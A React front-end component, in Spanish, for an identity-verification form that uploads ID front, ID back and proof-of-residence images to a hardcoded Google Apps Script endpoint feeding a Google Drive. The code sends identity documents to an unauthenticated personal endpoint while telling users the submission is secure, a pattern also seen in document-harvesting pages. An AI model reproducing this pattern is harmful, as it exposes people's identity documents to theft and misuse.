
import React, { useState, useCallback, useMemo } from 'react';
import { AppStatus, DocumentKey, VerificationState } from './types';
import Header from './components/Header';
import ProgressBar from './components/ProgressBar';
import KycCard from './components/KycCard';
import SuccessView from './components/SuccessView';
import PrivacyNotice from './components/PrivacyNotice';

// CONFIGURACIÓN: URL de la aplicación web de Google Apps Script
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxY3Yc72oLktyHwRyNgGa5AaPAHnAGj-s4kyjKqbAGKGa2C45LKVYHZJBN9L63R_Ap9/exec';

const App: React.FC = () => {
  const [status, setStatus] = useState<AppStatus>(AppStatus.UPLOADING_PHASE);
  const [state, setState] = useState<VerificationState>({
    front: { file: null, previewUrl: null, error: null },
    back: { file: null, previewUrl: null, error: null },
    residence: { file: null, previewUrl: null, error: null },
  });

  const handleFileChange = useCallback((key: DocumentKey, file: File | null) => {
    if (!file) {
      setState(prev => ({
        ...prev,
        [key]: { file: null, previewUrl: null, error: null }
      }));
      return;
    }

    const validTypes = ['image/jpeg', 'image/jpg', 'image/png'];
    const maxSize = 10 * 1024 * 1024; // 10MB limit

    let error = null;
    if (!validTypes.includes(file.type)) {
      error = 'Formato no permitido. Use JPG o PNG.';
    } else if (file.size > maxSize) {
      error = 'El archivo supera el límite de 10 MB.';
    }

    const previewUrl = error ? null : URL.createObjectURL(file);

    setState(prev => {
      if (prev[key].previewUrl) URL.revokeObjectURL(prev[key].previewUrl!);
      return {
        ...prev,
        [key]: { file: error ? null : file, previewUrl, error }
      };
    });
  }, []);

  const isComplete = useMemo(() => {
    return !!(state.front.file && state.back.file && state.residence.file);
  }, [state]);

  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = error => reject(error);
    });
  };

  const uploadToGoogleDrive = async (data: VerificationState) => {
    console.log('🚀 Iniciando proceso de envío a Google Drive...');
    
    if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL.includes('TU_URL')) {
      throw new Error("Falta configurar la URL de Google Apps Script");
    }

    try {
      const payload = {
        front: await fileToBase64(data.front.file!),
        back: await fileToBase64(data.back.file!),
        residence: await fileToBase64(data.residence.file!),
        metadata: {
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        }
      };

      console.log('📦 Payload generado con éxito. Enviando datos...');

      // Usamos no-cors por compatibilidad con Apps Script redirects
      await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'text/plain',
        },
        body: JSON.stringify(payload),
      });

      console.log('✅ Petición enviada al servidor. Verifique su Google Drive en unos segundos.');
      return true;
    } catch (error) {
      console.error('❌ Error durante la carga:', error);
      throw error;
    }
  };

  const handleSubmit = async () => {
    if (!isComplete) return;
    setStatus(AppStatus.SUBMITTING);
    
    try {
      await uploadToGoogleDrive(state);
      
      // Espera de seguridad para feedback visual
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      setStatus(AppStatus.SUCCESS);
      
      // Limpiar estados
      setState({
        front: { file: null, previewUrl: null, error: null },
        back: { file: null, previewUrl: null, error: null },
        residence: { file: null, previewUrl: null, error: null },
      });
    } catch (err) {
      console.error('🛑 Fallo en la sumisión:', err);
      alert('Hubo un problema al enviar los documentos. Por favor, intente de nuevo o verifique su conexión.');
      setStatus(AppStatus.UPLOADING_PHASE);
    }
  };

  const currentProgressStep = useMemo(() => {
    if (status === AppStatus.SUCCESS) return 4;
    if (state.residence.file) return 3;
    if (state.back.file) return 2;
    if (state.front.file) return 1;
    return 0;
  }, [state, status]);

  if (status === AppStatus.SUCCESS) {
    return <SuccessView onReset={() => setStatus(AppStatus.UPLOADING_PHASE)} />;
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-12 transition-all duration-300">
      <Header />
      <main className="max-w-xl mx-auto px-4 mt-8">
        <ProgressBar currentStep={currentProgressStep} />
        <div className="space-y-6 mt-8">
          <KycCard 
            title="Documento de Identidad – Frente" 
            description="Asegúrese de que el nombre y la foto sean visibles." 
            docKey="front" 
            info={state.front} 
            onFileChange={handleFileChange} 
            disabled={status === AppStatus.SUBMITTING} 
          />
          <KycCard 
            title="Documento de Identidad – Reverso" 
            description="Capture la parte posterior con todos los códigos legibles." 
            docKey="back" 
            info={state.back} 
            onFileChange={handleFileChange} 
            disabled={status === AppStatus.SUBMITTING} 
          />
          <KycCard 
            title="Comprobante de Residencia" 
            description="Recibo de servicio público no mayor a 3 meses." 
            docKey="residence" 
            info={state.residence} 
            onFileChange={handleFileChange} 
            disabled={status === AppStatus.SUBMITTING} 
          />
        </div>
        <button 
          onClick={handleSubmit} 
          disabled={!isComplete || status === AppStatus.SUBMITTING} 
          className={`w-full mt-10 py-4 rounded-xl font-bold text-lg transition-all transform active:scale-95 flex items-center justify-center gap-3 ${isComplete && status !== AppStatus.SUBMITTING ? 'bg-[#ceff04] text-[#1d1c2d] shadow-lg hover:shadow-xl hover:bg-[#dfff00]' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
        >
          {status === AppStatus.SUBMITTING ? (
            <>
              <div className="w-5 h-5 border-2 border-navy border-t-transparent rounded-full animate-spin"></div>
              Procesando envío seguro...
            </>
          ) : (
            'Enviar verificación'
          )}
        </button>
        <PrivacyNotice />
      </main>
    </div>
  );
};

export default App;
